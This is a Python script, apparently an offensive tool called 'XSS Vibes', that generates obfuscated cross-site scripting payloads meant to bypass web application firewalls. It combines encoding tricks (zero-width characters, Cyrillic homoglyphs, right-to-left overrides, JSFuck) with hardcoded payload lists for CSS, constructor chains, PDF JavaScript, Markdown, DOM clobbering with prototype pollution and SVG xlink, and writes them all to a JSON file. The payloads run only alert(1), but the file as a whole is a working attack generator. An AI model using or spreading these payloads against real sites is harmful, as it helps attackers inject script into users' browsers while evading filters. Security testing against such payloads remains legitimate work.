#!/usr/bin/env python3
"""
XSS Vibes - Advanced Obfuscation Engine
Implements the most insane XSS obfuscation techniques for WAF bypass
"""
import json
import random
import base64
import unicodedata
from typing import List, Dict, Any
import re
import string


class AdvancedXSSObfuscator:
    """Advanced XSS obfuscation techniques collection"""

    def __init__(self):
        # Zero-width characters (invisible)
        self.zero_width_chars = [
            "\u200b",  # Zero Width Space
            "\u200c",  # Zero Width Non-Joiner
            "\u200d",  # Zero Width Joiner
            "\u2060",  # Word Joiner
            "\ufeff",  # Zero Width No-Break Space
        ]

        # Homoglyph mappings (Cyrillic that looks like Latin)
        self.homoglyphs = {
            "a": "а",  # U+0430 Cyrillic
            "c": "с",  # U+0441 Cyrillic
            "e": "е",  # U+0435 Cyrillic
            "i": "і",  # U+0456 Cyrillic
            "o": "о",  # U+043E Cyrillic
            "p": "р",  # U+0440 Cyrillic
            "r": "г",  # U+0433 Cyrillic
            "s": "ѕ",  # U+0455 Cyrillic
            "t": "т",  # U+0442 Cyrillic
            "x": "х",  # U+0445 Cyrillic
        }

        # RTL override and bidi control characters
        self.bidi_chars = {
            "rlo": "\u202e",  # Right-to-Left Override
            "lro": "\u202d",  # Left-to-Right Override
            "pdf": "\u202c",  # Pop Directional Formatting
        }

        # Fullwidth Unicode characters
        self.fullwidth_map = {
            "a": "ａ",
            "l": "ｌ",
            "e": "ｅ",
            "r": "ｒ",
            "t": "ｔ",
            "s": "ｓ",
            "c": "ｃ",
            "i": "ｉ",
            "p": "ｐ",
            "o": "ｏ",
            "n": "ｎ",
            "f": "ｆ",
            "m": "ｍ",
            "d": "ｄ",
            "u": "ｕ",
            "(": "（",
            ")": "）",
            "1": "１",
            "0": "０",
        }

    def jsfuck_encode(self, text: str) -> str:
        """Converts text to JSFuck (JavaScript using only []()!+)"""
        # Simplified JSFuck encoder - full implementation would be huge
        jsfuck_map = {
            "a": "(![]+[])[+[]]",
            "l": "(![]+[])[!+[]+!+[]]",
            "e": "([][[]]+[])[!+[]+!+[]+!+[]]",
            "r": "([][[]]+[])[+!+[]]",
            "t": "(!![]+[])[+[]]",
            "(": "([]+[])[+!+[]+[+[]]]",
            ")": "([]+[])[!+[]+!+[]]",
            "1": "+!![]",
        }

        result = (
            "[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[+[]]]("
        )
        for char in text.lower():
            if char in jsfuck_map:
                result += jsfuck_map[char] + "+"
            elif char == " ":
                result += "([]+[])[+!+[]+[+[]]]+"
        result = result.rstrip("+") + ")())"
        return result

    def zero_width_obfuscate(self, payload: str) -> str:
        """Inserts random zero-width characters"""
        result = ""
        for char in payload:
            result += char
            if random.random() < 0.3:  # 30% chance to add zero-width char
                result += random.choice(self.zero_width_chars)
        return result

    def homoglyph_substitute(self, payload: str) -> str:
        """Replaces ASCII letters with Cyrillic homoglyphs"""
        result = ""
        for char in payload:
            if char.lower() in self.homoglyphs and random.random() < 0.5:
                if char.isupper():
                    result += self.homoglyphs[char.lower()].upper()
                else:
                    result += self.homoglyphs[char.lower()]
            else:
                result += char
        return result

    def rlo_obfuscate(self, payload: str) -> str:
        """Uses RTL override to confuse parsers"""
        # Insert RLO character in strategic places
        if "script" in payload.lower():
            payload = payload.replace("script", f'scri{self.bidi_chars["rlo"]}pt')
        return payload

    def fullwidth_transform(self, payload: str) -> str:
        """Converts to fullwidth Unicode characters"""
        result = ""
        for char in payload:
            if char.lower() in self.fullwidth_map:
                result += self.fullwidth_map[char.lower()]
            else:
                result += char
        return result

    def charcode_encode(self, text: str) -> str:
        """Converts text to String.fromCharCode()"""
        codes = [str(ord(char)) for char in text]
        return f"String.fromCharCode({','.join(codes)})"

    def unicode_escape_encode(self, text: str) -> str:
        """Converts text to Unicode escape sequences"""
        result = ""
        for char in text:
            if char.isalnum():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    def hex_escape_encode(self, text: str) -> str:
        """Converts text to hex escape sequences"""
        result = ""
        for char in text:
            if char.isalnum():
                result += f"\\x{ord(char):02x}"
            else:
                result += char
        return result

    def octal_escape_encode(self, text: str) -> str:
        """Converts text to octal escape sequences"""
        result = ""
        for char in text:
            if char.isalnum():
                result += f"\\{oct(ord(char))[2:]}"
            else:
                result += char
        return result

    def base64_data_uri(self, payload: str) -> str:
        """Creates base64 data URI payload"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f'<iframe src="data:text/html;base64,{encoded}"></iframe>'

    def css_expression_xss(self, js_code: str = "alert(1)") -> List[str]:
        """Creates CSS-based XSS payloads"""
        return [
            f'<div style="width:expression({js_code})">',
            f'<style>body{{background:url("javascript:{js_code}")}}</style>',
            f'<link rel="stylesheet" href="javascript:{js_code}">',
            f'<style>@import"javascript:{js_code}";</style>',
        ]

    def constructor_chain_obfuscate(self, js_code: str) -> List[str]:
        """Creates constructor chain payloads"""
        return [
            f"[].constructor.constructor('{js_code}')()",
            f"({{}}['constructor']['constructor']('{js_code}'))()",
            f"Function('{js_code}')()",
            f"[]['filter']['constructor']('{js_code}')()",
            f"(![]+[])[+[]][+!![]][+!![]][+!![]]['constructor']('{js_code}')()",
        ]

    def template_literal_obfuscate(self, js_code: str) -> List[str]:
        """Creates template literal based payloads"""
        return [
            f"`${{'{js_code}'}}`.replace(/.*/,eval)",
            f"eval`{js_code}`",
            f"`{js_code}`.replace(/.*/,Function)",
        ]

    def svg_base64_emoji_obfuscation(self, payload: str) -> str:
        """SVG + Base64 + emoji + zero-width obfuscation"""
        # Add zero-width characters to payload
        obfuscated = ""
        for char in payload:
            obfuscated += char + random.choice(self.zero_width_chars)

        # Encode with Base64
        b64_payload = base64.b64encode(obfuscated.encode()).decode()

        # Create SVG with embedded script and emojis
        svg_payload = f"""<svg onload="eval(atob('{b64_payload}'))">🎯💀👻🔥</svg>"""
        return svg_payload

    def math_random_constructor(self) -> str:
        """Math.random().constructor technique"""
        return "Math.random().constructor('alert(1)')()"

    def array_fill_constructor(self) -> str:
        """Array fill constructor with URL encoding"""
        return "[]['fill']['constructor'](unescape('%61%6C%65%72%74(1)'))();alert(1)"

    def object_entries_constructor(self) -> str:
        """Object.entries constructor chain"""
        return "Object.entries(1)['constructor']['constructor']('alert(1)')()"

    def advanced_constructor_chains(self) -> List[str]:
        """Collection of advanced constructor chain techniques"""
        return [
            "Math.random().constructor('alert(1)')()",
            "[]['fill']['constructor'](unescape('%61%6C%65%72%74(1)'))();alert(1)",
            "Object.entries(1)['constructor']['constructor']('alert(1)')()",
            "Array.from.constructor('alert(1)')()",
            "String.fromCharCode.constructor('alert(1)')()",
            "Number.constructor.constructor('alert(1)')()",
            "Date.constructor.constructor('alert(1)')()",
            "RegExp.constructor.constructor('alert(1)')()",
        ]

    def pdf_xss_payloads(self) -> List[str]:
        """PDF-based XSS techniques - INSANE level!"""
        return [
            # PDF JavaScript injection
            """<embed src="data:application/pdf;base64,JVBERi0xLjQKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovT3V0bGluZXMgMiAwIFIKL1BhZ2VzIDMgMCBSCj4+CmVuZG9iagoyIDAgb2JqCjw8Cj4+CmVuZG9iagozIDAgb2JqCjw8Ci9UeXBlIC9QYWdlcwovQ291bnQgMQovS2lkcyBbNSAwIFJdCj4+CmVuZG9iago0IDAgb2JqCjw8Ci9UeXBlIC9QYWdlCi9QYXJlbnQgMyAwIFIKL01lZGlhQm94IFswIDAgNjEyIDc5Ml0KL0NvbnRlbnRzIDYgMCBSCi9SZXNvdXJjZXMgPDwKL1Byb2NTZXQgNyAwIFIKPj4KPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL1BhZ2UKL1BhcmVudCAzIDAgUgovTWVkaWFCb3ggWzAgMCA2MTIgNzkyXQovQ29udGVudHMgNiAwIFIKL1Jlc291cmNlcyA8PAovUHJvY1NldCA3IDAgUgo+PgovQWN0aW9ucyA4IDAgUgo+PgplbmRvYmoKNiAwIG9iago8PAovTGVuZ3RoIDQ0Cj4+CnN0cmVhbQpCVAovRjEgMTIgVGYKNzIgNzIwIFRkCihIZWxsbyBXb3JsZCEpIFRqCkVUCmVuZHN0cmVhbQplbmRvYmoKNyAwIG9iago8PAovRm9udCA5IDAgUgo+PgplbmRvYmoKOCAwIG9iago8PAovVHlwZSAvQWN0aW9uCi9TIC9KYXZhU2NyaXB0Ci9KUyAoYWxlcnQoJ1hTUyBpbiBQREYhJyk7KQo+PgplbmRvYmoKOSAwIG9iago8PAovRjEgMTAgMCBSCj4+CmVuZG9iagoxMCAwIG9iago8PAovVHlwZSAvRm9udAovU3VidHlwZSAvVHlwZTEKL0Jhc2VGb250IC9IZWx2ZXRpY2EKPj4KZW5kb2JqCnhyZWYKMCAxMQowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMTAgMDAwMDAgbiAKMDAwMDAwMDA3OCAzOTAwMCBuIAowMDAwMDAwMDk3IDAwMDAwIG4gCjAwMDAwMDAxNTQgMDAwMDAgbiAKMDAwMDAwMDMxMCAwMDAwMCBuIAowMDAwMDAwNDY4IDAwMDAwIG4gCjAwMDAwMDA1NjIgMDAwMDAgbiAKMDAwMDAwMDU5NCAwMDAwMCBuIAowMDAwMDAwNjk0IDAwMDAwIG4gCjAwMDAwMDA3MzEgMDAwMDAgbiAKdHJhaWxlcgo8PAovU2l6ZSAxMQovUm9vdCAxIDAgUgo+PgpzdGFydHhyZWYKODI4CiUlRU9G" width="500" height="600">""",
            # PDF with Form XSS
            """<object data="data:application/pdf;base64,JVBERi0xLjcKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovT3V0bGluZXMgMiAwIFIKL1BhZ2VzIDMgMCBSCi9PcGVuQWN0aW9uIDQgMCBSCj4+CmVuZG9iago0IDAgb2JqCjw8Ci9UeXBlIC9BY3Rpb24KL1MgL0phdmFTY3JpcHQKL0pTIChcCnRoaXMucHJpbnQoe1wKYkZsYXR0ZW5BbGw6IGZhbHNlLFwKYVNpbGVudDogZmFsc2UsXApiUHJpbnREaWFsb2c6IGZhbHNlLFwKYlNocmluayBUb0ZpdDogdHJ1ZVwKfSk7XApldmFsKGRlY29kZVVSSUNvbXBvbmVudCgnYWxlcnQoJ1BERiUyMFhTUyUyMGF0dGFjayEnKScpKTtcCilcCj4+CmVuZG9iCj4+CmVuZG9iagplbmRvYmoK" width="1" height="1"></object>""",
            # PDF with Embedded JavaScript
            """<iframe src="data:application/pdf;base64,JVBERi0xLjQKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKL09wZW5BY3Rpb24gPDwgL1MgL0phdmFTY3JpcHQgL0pTIChcXGFsZXJ0KCdQREYgWFNTJyk7XFwpID4+Cj4+CmVuZG9iago=" width="0" height="0"></iframe>""",
        ]

    def markdown_xss_payloads(self) -> List[str]:
        """Markdown-based stored XSS - LEGENDARY techniques!"""
        return [
            # Markdown link injection
            """[Click me](javascript:alert('Markdown XSS'))""",
            # Markdown image XSS
            """![XSS](javascript:alert('Image XSS'))""",
            # Markdown with HTML injection
            """[XSS](<script>alert('Markdown HTML XSS')</script>)""",
            # Markdown autolink XSS
            """<javascript:alert('Autolink XSS')>""",
            # Markdown reference link XSS
            """[XSS][1]
[1]: javascript:alert('Reference XSS')""",
            # Markdown with data URI
            """![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnTWFya2Rvd24gRGF0YSBVUkkgWFNTJyk8L3NjcmlwdD4=)""",
            # Markdown table XSS
            """| Column 1 | Column 2 |
|----------|----------|
| Normal   | <script>alert('Table XSS')</script> |""",
            # Markdown code block escape
            """```
<script>alert('Code block escape XSS')</script>
```""",
            # Markdown with SVG injection
            """![SVG](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdTVkcgWFNTJykiPjwvc3ZnPg==)""",
        ]

    def dom_clobbering_prototype_pollution(self) -> List[str]:
        """DOM Clobbering + Prototype Pollution for chain execution - GOD TIER!"""
        return [
            # Basic DOM clobbering with prototype pollution
            """<form id="constructor"><input name="prototype" value="<img src=x onerror=alert('DOM+Prototype')>"></form>
<script>
if(window.constructor && window.constructor.prototype) {
    eval(window.constructor.prototype);
}
</script>""",
            # Advanced prototype pollution chain
            """<form id="Object"><input name="prototype" value="polluted"><input name="polluted" value="alert('Prototype pollution!')"></form>
<script>
for(let key in Object.prototype) {
    if(typeof Object.prototype[key] === 'string') {
        eval(Object.prototype[key]);
    }
}
</script>""",
            # DOM clobbering with constructor chain
            """<iframe name="constructor" src="javascript:alert('Constructor DOM clobbering')"></iframe>
<script>
if(window.constructor && typeof window.constructor === 'object') {
    window.constructor.constructor('alert("Chain execution!")')();
}
</script>""",
            # Prototype pollution via form elements
            """<form id="Array">
<input name="prototype" value="poisoned">
<input name="poisoned" value="<script>alert('Array prototype pollution!')</script>">
</form>
<script>
if(Array.prototype.poisoned) {
    document.body.innerHTML += Array.prototype.poisoned;
}
</script>""",
            # DOM clobbering with __proto__ pollution
            """<iframe srcdoc="<form id='__proto__'><input name='polluted' value='alert(1)'></form>"></iframe>
<script>
setTimeout(() => {
    if(window.__proto__ && window.__proto__.polluted) {
        eval(window.__proto__.polluted);
    }
}, 100);
</script>""",
        ]

    def svg_xlink_href_xss(self) -> List[str]:
        """SVG xlink:href trickery - INSANE level obfuscation!"""
        return [
            # Basic SVG use with xlink:href
            """<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1NWRyB4bGluayBYU1MnKTwvc2NyaXB0Pjwvc3ZnPg=="#xss"></use></svg>""",
            # SVG with external xlink reference
            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<g id="xss">
<script>alert('SVG xlink:href XSS')</script>
</g>
</defs>
<use xlink:href="#xss"/>
</svg>""",
            # SVG use with JavaScript protocol
            """<svg><use xlink:href="javascript:alert('xlink:href JavaScript XSS')"></use></svg>""",
            # SVG with data URI and base64 payload
            """<svg><use xlink:href="data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgnU1ZHIGRhdGEgVVJJIFhTUycpPC9zY3JpcHQ+"></use></svg>""",
            # SVG animation with xlink:href
            """<svg xmlns:xlink="http://www.w3.org/1999/xlink">
<animate xlink:href="javascript:alert('SVG animate XSS')" attributeName="href" dur="1s"/>
</svg>""",
            # SVG with foreign object and xlink
            """<svg xmlns:xlink="http://www.w3.org/1999/xlink">
<foreignObject>
<use xlink:href="data:text/html,<script>alert('foreignObject XSS')</script>"/>
</foreignObject>
</svg>""",
            # SVG with nested use elements
            """<svg xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<g id="level1">
<use xlink:href="#level2"/>
</g>
<g id="level2">
<script>alert('Nested SVG use XSS')</script>
</g>
</defs>
<use xlink:href="#level1"/>
</svg>""",
            # SVG with xlink:href fragment identifier
            """<svg xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('Fragment XSS')</script></svg>#fragment"/>
</svg>""",
        ]

    def fetch_api_obfuscate(self, js_code: str) -> str:
        """Uses modern Fetch API for obfuscation"""
        encoded = base64.b64encode(js_code.encode()).decode()
        return (
            f"fetch('data:text/plain,'+atob('{encoded}')).then(r=>r.text()).then(eval)"
        )

    def regex_source_obfuscate(self, js_code: str) -> str:
        """Uses regex source property"""
        return f"/{js_code}/.source.replace(/.*/,eval)"

    def dom_clobbering_payload(self) -> str:
        """Creates DOM clobbering XSS"""
        return """<form id=x><input id=y></form>
<script>x.y.value='<img src=x onerror=alert(1)>';document.body.innerHTML+=x.y.value</script>"""

    def css_animation_xss(self) -> str:
        """Creates CSS animation XSS payload"""
        return """<style>@keyframes x{from {left:0;}to {left: 100%;}}:target {animation:10s ease-in-out 0s infinite alternate x;}body:target {background-color: pink;}</style><a id=x style="background-color:red;position:absolute;left:0;text-decoration:none;" href="#x">Click me</a>"""

    def overlong_utf8_encode(self, payload: str) -> str:
        """Creates overlong UTF-8 encoding"""
        result = ""
        for char in payload:
            if char == "<":
                result += "%c0%3c"
            elif char == ">":
                result += "%c0%3e"
            elif char == "/":
                result += "%c0%2f"
            else:
                result += char
        return result

    def cuneiform_jsfuck(self) -> str:
        """Returns the legendary cuneiform JSFuck payload"""
        return """𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒍢=𒉺[𒈨=𒀀],𒊑=++𒀀+𒀀,𒀕=𒇺[𒊬=𒀀],𒄿=𒌐+𒀕+𒉺[𒊑]+𒇺[𒊑]+𒍢[𒊑],
𒄿=𒄿[𒉺[𒊑]+𒍢[𒀀]+𒌐+𒇺[𒊑]+𒍢[𒊑]+𒀕](𒍢[𒈨]+𒍢[𒊬=𒀀]+
(𒉺[𒊑]+𒀀)[𒊑]+𒀃+𒍢[++𒊬]+𒀀+(𒇺+𒍢[𒊬])[𒀀]+𒀃+𒍢[𒊑]+
𒌐+𒍢[++𒊬]+'("'+(𒀀+𒉺)[𒊑]+(𒉺[𒊑]+𒀀)[𒀀]+'𒐖𒐗𒐘")')(),𒄿"""

    def generate_wild_payloads(
        self, base_payload: str = "alert(1)"
    ) -> List[Dict[str, Any]]:
        """Generates a collection of wild obfuscated payloads"""
        payloads = []

        # 1. Zero-width obfuscation
        payloads.append(
            {
                "payload": f"<script>{self.zero_width_obfuscate(base_payload)}</script>",
                "technique": "zero_width_obfuscation",
                "description": "Uses invisible zero-width Unicode characters",
            }
        )

        # 2. Homoglyph substitution
        payloads.append(
            {
                "payload": f"<{self.homoglyph_substitute('script')}>{self.homoglyph_substitute(base_payload)}</{self.homoglyph_substitute('script')}>",
                "technique": "homoglyph_substitution",
                "description": "Uses Cyrillic characters that look like Latin",
            }
        )

        # 3. RTL override
        payloads.append(
            {
                "payload": self.rlo_obfuscate(f"<script>{base_payload}</script>"),
                "technique": "rtl_override",
                "description": "Uses Right-to-Left override Unicode character",
            }
        )

        # 4. Fullwidth Unicode
        payloads.append(
            {
                "payload": f"<script>{self.fullwidth_transform(base_payload)}</script>",
                "technique": "fullwidth_unicode",
                "description": "Uses fullwidth Unicode characters",
            }
        )

        # 5. CharCode encoding
        payloads.append(
            {
                "payload": f"<script>eval({self.charcode_encode(base_payload)})</script>",
                "technique": "charcode_encoding",
                "description": "Uses String.fromCharCode() encoding",
            }
        )

        # 6. Unicode escape sequences
        payloads.append(
            {
                "payload": f"<script>{self.unicode_escape_encode(base_payload)}</script>",
                "technique": "unicode_escape",
                "description": "Uses Unicode escape sequences",
            }
        )

        # 7. Hex escape sequences
        payloads.append(
            {
                "payload": f"<script>{self.hex_escape_encode(base_payload)}</script>",
                "technique": "hex_escape",
                "description": "Uses hexadecimal escape sequences",
            }
        )

        # 8. Base64 data URI
        payloads.append(
            {
                "payload": self.base64_data_uri(f"<script>{base_payload}</script>"),
                "technique": "base64_data_uri",
                "description": "Uses base64 encoded data URI",
            }
        )

        # 9. CSS Expression XSS
        for css_payload in self.css_expression_xss(base_payload):
            payloads.append(
                {
                    "payload": css_payload,
                    "technique": "css_expression",
                    "description": "CSS-based XSS execution",
                }
            )

        # 10. Constructor chains
        for constructor_payload in self.constructor_chain_obfuscate(base_payload):
            payloads.append(
                {
                    "payload": f"<script>{constructor_payload}</script>",
                    "technique": "constructor_chain",
                    "description": "Uses JavaScript constructor chains",
                }
            )

        # 11. Template literals
        for template_payload in self.template_literal_obfuscate(base_payload):
            payloads.append(
                {
                    "payload": f"<script>{template_payload}</script>",
                    "technique": "template_literal",
                    "description": "Uses ES6 template literals",
                }
            )

        # 12. Fetch API obfuscation
        payloads.append(
            {
                "payload": f"<script>{self.fetch_api_obfuscate(base_payload)}</script>",
                "technique": "fetch_api",
                "description": "Uses modern Fetch API with base64",
            }
        )

        # 13. Regex source property
        payloads.append(
            {
                "payload": f"<script>{self.regex_source_obfuscate(base_payload)}</script>",
                "technique": "regex_source",
                "description": "Uses regex source property",
            }
        )

        # 14. DOM clobbering
        payloads.append(
            {
                "payload": self.dom_clobbering_payload(),
                "technique": "dom_clobbering",
                "description": "DOM clobbering attack",
            }
        )

        # 15. CSS Animation XSS
        payloads.append(
            {
                "payload": self.css_animation_xss(),
                "technique": "css_animation",
                "description": "CSS animation-based XSS",
            }
        )

        # 16. Overlong UTF-8
        payloads.append(
            {
                "payload": self.overlong_utf8_encode(
                    f"<script>{base_payload}</script>"
                ),
                "technique": "overlong_utf8",
                "description": "Overlong UTF-8 encoding",
            }
        )

        # 17. LEGENDARY Cuneiform JSFuck
        payloads.append(
            {
                "payload": f"<script>{self.cuneiform_jsfuck()}</script>",
                "technique": "cuneiform_jsfuck",
                "description": "LEGENDARY: 4000-year-old cuneiform script JSFuck",
            }
        )

        # 18. Combined techniques (the most insane)
        combined = self.zero_width_obfuscate(
            self.homoglyph_substitute(self.fullwidth_transform(base_payload))
        )
        payloads.append(
            {
                "payload": f"<script>{combined}</script>",
                "technique": "combined_madness",
                "description": "Combines multiple obfuscation techniques",
            }
        )

        # 19. SVG + Base64 + Emoji + Zero-width
        payloads.append(
            {
                "payload": self.svg_base64_emoji_obfuscation(base_payload),
                "technique": "svg_base64_emoji_zw",
                "description": "SVG with Base64 encoded payload + emojis + zero-width chars",
            }
        )

        # 20. Math.random constructor
        payloads.append(
            {
                "payload": f"<script>{self.math_random_constructor()}</script>",
                "technique": "math_random_constructor",
                "description": "Math.random().constructor technique",
            }
        )

        # 21. Array fill constructor with unescape
        payloads.append(
            {
                "payload": f"<script>{self.array_fill_constructor()}</script>",
                "technique": "array_fill_constructor",
                "description": "Array fill constructor with URL encoded payload",
            }
        )

        # 22. Object.entries constructor
        payloads.append(
            {
                "payload": f"<script>{self.object_entries_constructor()}</script>",
                "technique": "object_entries_constructor",
                "description": "Object.entries constructor chain exploitation",
            }
        )

        # 23. Advanced constructor chains collection
        for i, constructor_payload in enumerate(self.advanced_constructor_chains()):
            payloads.append(
                {
                    "payload": f"<script>{constructor_payload}</script>",
                    "technique": f"advanced_constructor_{i+1}",
                    "description": f"Advanced constructor chain technique #{i+1}",
                }
            )

        # 24. PDF XSS techniques - INSANE level!
        for i, pdf_payload in enumerate(self.pdf_xss_payloads()):
            payloads.append(
                {
                    "payload": pdf_payload,
                    "technique": f"pdf_xss_{i+1}",
                    "description": f"PDF-based XSS technique #{i+1} - LEGENDARY!",
                }
            )

        # 25. Markdown XSS - Stored XSS via Markdown
        for i, markdown_payload in enumerate(self.markdown_xss_payloads()):
            payloads.append(
                {
                    "payload": markdown_payload,
                    "technique": f"markdown_xss_{i+1}",
                    "description": f"Markdown-based stored XSS #{i+1}",
                }
            )

        # 26. DOM Clobbering + Prototype Pollution - GOD TIER!
        for i, dom_proto_payload in enumerate(
            self.dom_clobbering_prototype_pollution()
        ):
            payloads.append(
                {
                    "payload": dom_proto_payload,
                    "technique": f"dom_prototype_{i+1}",
                    "description": f"DOM Clobbering + Prototype Pollution #{i+1} - GOD TIER!",
                }
            )

        # 27. SVG xlink:href trickery - INSANE obfuscation!
        for i, svg_xlink_payload in enumerate(self.svg_xlink_href_xss()):
            payloads.append(
                {
                    "payload": svg_xlink_payload,
                    "technique": f"svg_xlink_{i+1}",
                    "description": f"SVG xlink:href XSS trickery #{i+1} - INSANE!",
                }
            )

        return payloads


def main():
    """Generate wild obfuscated XSS payloads"""
    print("🔥 XSS Vibes - Advanced Obfuscation Engine")
    print("=" * 60)

    obfuscator = AdvancedXSSObfuscator()

    # Generate wild payloads
    wild_payloads = obfuscator.generate_wild_payloads("alert(1)")

    print(f"🧙‍♂️ Generated {len(wild_payloads)} insane obfuscated payloads:\n")

    for i, payload_data in enumerate(wild_payloads, 1):
        print(f"🎯 Technique {i}: {payload_data['technique']}")
        print(f"📝 Description: {payload_data['description']}")
        print(f"💀 Payload: {payload_data['payload'][:100]}...")
        if len(payload_data["payload"]) > 100:
            print("    [truncated]")
        print("-" * 50)

    # Save to JSON
    output_data = []
    for payload_data in wild_payloads:
        output_data.append(
            {
                "Payload": payload_data["payload"],
                "technique": payload_data["technique"],
                "description": payload_data["description"],
                "category": "advanced_obfuscation",
                "waf": "obfuscation_bypass",
                "source": "advanced_obfuscator",
            }
        )

    with open("advanced_obfuscated_payloads.json", "w", encoding="utf-8") as f:
        json.dump(output_data, f, indent=2, ensure_ascii=False)

    print(f"✅ Saved {len(output_data)} advanced obfuscated payloads!")
    print("💾 File: advanced_obfuscated_payloads.json")


if __name__ == "__main__":
    main()
